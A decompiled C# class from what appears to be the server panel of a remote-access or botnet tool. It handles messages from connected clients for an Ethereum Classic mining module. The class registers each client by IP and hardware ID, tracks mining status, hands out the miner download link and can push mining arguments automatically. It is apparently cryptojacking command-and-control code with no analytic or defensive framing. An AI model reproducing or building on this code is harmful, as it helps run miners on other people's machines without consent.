using System;
using System.Windows.Forms;
using Server.Connectings;

namespace Server.Messages
{
	// Token: 0x02000047 RID: 71
	internal class HandlerMinerEtc
	{
		// Token: 0x060001BF RID: 447 RVA: 0x0001C548 File Offset: 0x0001A748
		public static void Read(Clients clients, object[] array)
		{
			string a = (string)array[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Status"))
				{
					if (!(a == "GetLink"))
					{
						return;
					}
					clients.Send(new object[]
					{
						"Link",
						Program.form.settings.linkMiner
					});
					return;
				}
				else
				{
					if (clients.Tag == null)
					{
						clients.Disconnect();
						return;
					}
					Program.form.MinerEtc.GridClients.Invoke(new MethodInvoker(delegate()
					{
						((DataGridViewRow)clients.Tag).Cells[2].Value = (string)array[2];
					}));
					return;
				}
			}
			else
			{
				if (Program.form.MinerEtc.work)
				{
					clients.Hwid = (string)array[2];
					DataGridViewRow Item = new DataGridViewRow();
					Item.Tag = clients;
					Item.Cells.Add(new DataGridViewTextBoxCell
					{
						Value = clients.IP
					});
					Item.Cells.Add(new DataGridViewTextBoxCell
					{
						Value = clients.Hwid
					});
					Item.Cells.Add(new DataGridViewTextBoxCell
					{
						Value = "dont mining"
					});
					Item.Cells.Add(new DataGridViewTextBoxCell
					{
						Value = (string)array[3]
					});
					Item.Cells.Add(new DataGridViewTextBoxCell
					{
						Value = (string)array[4]
					});
					clients.Tag = Item;
					Program.form.MinerEtc.Invoke(new MethodInvoker(delegate()
					{
						Program.form.MinerEtc.GridClients.Rows.Add(Item);
						if (Program.form.MinerEtc.materialSwitch7.Checked)
						{
							clients.Send(Program.form.MinerEtc.Args());
						}
					}));
					return;
				}
				clients.Disconnect();
				return;
			}
		}
	}
}
